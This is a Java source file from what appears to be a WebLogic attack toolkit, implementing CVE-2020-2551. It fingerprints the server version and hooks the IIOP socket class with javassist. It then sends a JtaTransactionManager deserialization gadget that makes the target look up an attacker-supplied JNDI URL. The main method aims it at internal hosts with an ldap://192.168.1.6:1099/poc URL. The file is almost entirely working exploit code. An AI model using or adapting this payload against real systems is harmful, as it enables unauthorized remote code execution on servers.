package com.r4v3zn.weblogic.tools.payloads.impl;

import cn.hutool.core.lang.JarClassLoader;
import com.r4v3zn.weblogic.tools.annotation.Authors;
import com.r4v3zn.weblogic.tools.annotation.Dependencies;
import com.r4v3zn.weblogic.tools.entity.MyException;
import com.r4v3zn.weblogic.tools.gadget.impl.JtaTransactionManagerGadget;
import com.r4v3zn.weblogic.tools.payloads.VulTest;
import com.r4v3zn.weblogic.tools.translator.MyTranslator;
import javassist.*;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.io.File;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.List;

import static com.r4v3zn.weblogic.tools.gadget.impl.JtaTransactionManagerGadget.JTATRANSACTIONMANAGER_CLASS_NAME;
import static com.r4v3zn.weblogic.tools.utils.VersionUtils.getVersion;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: CVE_2020_2551
 * Descrption:
 * <p>
 *     攻击者可以通过 IIOP 协议远程访问 Weblogic Server 服务器上的远程接口，传入恶意数据，从而获取服务器 权限并在未授权情况下远程执行任意代码。
 *     漏洞影响版本:
 *     Oracle WebLogic Server 10.3.6.0.0
 *     Oracle WebLogic Server 12.1.3.0.0
 *     Oracle WebLogic Server 12.2.1.3.0
 *     Oracle WebLogic Server 12.2.1.4.0
 *     github: https://github.com/0nise/CVE-2020-2551
 * </p>
 * Date:2020/3/23 23:05
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 * @author R4v3zn
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
@Dependencies({":com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager"})
public class CVE_2020_2551 implements VulTest {

    /**
     * 漏洞影响版本
     */
    public static final List<String> VUL_VERSIONS = new ArrayList<String>(){{
        add("10.3.6.0");
        add("12.1.3.0");
        add("12.2.1.3.0");
        add("12.2.1.4.0");
    }};

    /**
     * IIOP SOCKET Class name
     * "weblogic.socket.SocketMuxer";
     * "weblogic.iiop.MuxableSocketIIOP";
     */
    private static final String IIOP_SOCKET_CLASS_NAME= "weblogic.iiop.MuxableSocketIIOP";

    /**
     * 漏洞验证,漏洞存在返回 true 否则返回 false
     * @param ip ip
     * @param port 端口
     * @return 漏洞存在返回 true 否则返回 false
     */
    @Override
    public Boolean vulnerable(String ip, Integer port,String... param) throws Exception{
        // weblogic version
        String version = getVersion(ip, port);
        System.out.println("[*] weblogic version --> "+version);
        if(isBlank(version) || !VUL_VERSIONS.contains(version)){
            return false;
        }
        URLClassLoader urlClassLoader = null;
        try{
            urlClassLoader = loadClass(version);
            hookSocket(ip, port);
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }
        if(param.length == 0){
            throw new MyException("请输入JNDI URL");
        }
        String jndiUrl = param[0];
        Hashtable<String, String> env = new Hashtable<String, String>();
        env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
        env.put("java.naming.provider.url" , String.format("iiop://%s:%s", ip, port));
        Context context = null;
        try {
            context = new InitialContext(env);
        } catch (NamingException e) {
            e.printStackTrace();
            return false;
        }
        JtaTransactionManagerGadget payload = new JtaTransactionManagerGadget();
        Object object = null;
        try {
            object = payload.getObject(jndiUrl,urlClassLoader);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        try{
            context.rebind("hello",object);
        }catch (Exception e){
            String msg = e.getMessage();
            if("Unhandled exception in rebind()".equals(msg)){
                return true;
            }else{
                return false;
            }
        }
        return false;
    }

    /**
     * 加载 class loader
     * @param version
     * @throws NotFoundException
     */
    public URLClassLoader loadClass(String version) throws NotFoundException, MalformedURLException {
        String pocName = "com.bea.core.repackaged.springframework.spring.jar";
        String pocLog = "com.bea.core.repackaged.apache.commons.logging.jar";
        System.out.println("[*] load class com.bea.core.repackaged.springframework.spring.jar version --> "+version);
        String path = this.getClass().getResource("/lib/").getPath();
        String pocNamePath = path +"12.2.1.3.0/" + pocName;
        String pocLogPath = path +"12.2.1.3.0/" + pocName;
        if(version.contains("10.3.6") || version.contains("12.1.3")){
            pocNamePath = path + "10.3.6.0.0/" + pocName;
            pocLogPath = path + "10.3.6.0.0/" + pocLog;
        }
        System.out.println("[*] jat path --> "+pocNamePath);
        System.out.println("[*] jat log path --> "+pocLogPath);
        URL[] urls = new URL[]{new URL("file:"+pocNamePath)};
        return new URLClassLoader(urls);
    }

    /**
     * hook socket
     * @param ip ip
     * @param port port
     * @throws Exception
     */
    public void hookSocket(String ip, Integer port) throws Exception {
        System.gc();
        ClassPool cp = new ClassPool(true);
        CtClass ctClass = cp.get(IIOP_SOCKET_CLASS_NAME);
        ctClass.defrost();
        if(ctClass.isFrozen()){

        }
        String code = "{" +
                "$1 = java.net.InetAddress.getByName(\"" + ip + "\");\n" +
                "$2 = " + port + ";}";
        CtMethod ctMethod = ctClass.getDeclaredMethod("connect", new CtClass[]{cp.get(InetAddress.class.getName()), cp.get("int")});
        ctMethod.insertBefore(code);
        ctClass.toClass();
//        ctClass.stopPruning(true);
//        ctClass.defrost();
//        CtMethod ctMethod = ctClass.getDeclaredMethods("newSocket")[1];
//        ctMethod.setBody("{\n" +
//                "    java.net.InetAddress inet = java.net.InetAddress.getByName(\""+ip+"\");\n" +
//                "    $1 = inet;\n" +
//                "    java.net.Socket var4 = new java.net.Socket();\n" +
//                "    initSocket(var4);\n" +
//                "    var4.connect(new java.net.InetSocketAddress($1, $2), $3);\n" +
//                "    return var4;\n" +
//                "}");    }
    }

    /**
     * 漏洞利用
     * @param ip ip
     * @param port 端口
     * @throws Exception 抛出异常
     */
    @Override
    public void exploit(String ip, Integer port) throws Exception {
        // no
    }

    public static void main(String[] args) throws Exception {
        CVE_2020_2551 vul = new CVE_2020_2551();
        String jdnUrl = "ldap://192.168.1.6:1099/poc";

        vul.vulnerable("192.168.1.10", 7001,jdnUrl);
        vul.vulnerable("192.168.1.3", 7001,jdnUrl);
//        vul.loadClass("10.3.6.0");
    }
}
